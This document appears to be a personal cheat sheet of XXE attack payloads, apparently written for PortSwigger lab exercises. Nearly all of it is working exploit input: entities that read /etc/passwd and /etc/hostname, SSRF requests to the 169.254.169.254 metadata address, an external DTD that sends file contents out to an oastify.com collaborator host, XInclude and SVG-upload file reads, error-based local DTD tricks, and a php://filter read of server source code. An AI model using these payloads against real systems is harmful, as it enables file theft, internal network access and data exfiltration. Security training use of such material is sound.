#!/usr/bin/peno

#Basic Exploiting XXE using external entities to retrieve files
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>			//this line has been inserted
<stockCheck>
<productId>&xxe;</productId>							// die product number has beed replaced with &xxe;
<storeId>1</storeId>
</stockCheck>


#Exploiting XXE to perform SSRF attacks

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/admin"> ]>		//this line has been inserted
<stockCheck>
<productId> &xxe;</productId>							// die product number has beed replaced with &xxe;
<storeId>1</storeId>
</stockCheck>

#Blind XXE with out-of-band interaction

<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
.. 
&xxe;

#Blind XXE with out-of-band interaction via XML parameter entities
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>

//Exploiting blind XXE to exfiltrate data using a malicious external DTD
<!ENTITY % file SYSTEM "file:///etc/hostname">										//On the exploit server URL=https://exploit-0a4b00fa04ff27c1c08e4063015600e4.exploit-server.net/exploit
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://716a3zyakekbtzc9ndo3y91uzl5ct7hw.oastify.com/?x=%file;'>">	//On the exploit server URL=https://exploit-0a4b00fa04ff27c1c08e4063015600e4.exploit-server.net/exploit
%eval;															//On the exploit server	URL=https://exploit-0a4b00fa04ff27c1c08e4063015600e4.exploit-server.net/exploit
%exfil;															//On the exploit server URL=https://exploit-0a4b00fa04ff27c1c08e4063015600e4.exploit-server.net/exploit
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>								//On Repeater


#Exploiting XInclude to retrieve files
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

#Exploiting XXE via image file upload

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>

#Exploiting XXE to retrieve data by repurposing a local DTD
#Insert the following parameter entity definition in between the XML declaration and the stockCheck element
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>


#PHP Filters with XXE to read the source code of the files on the webserver
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=info.php" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
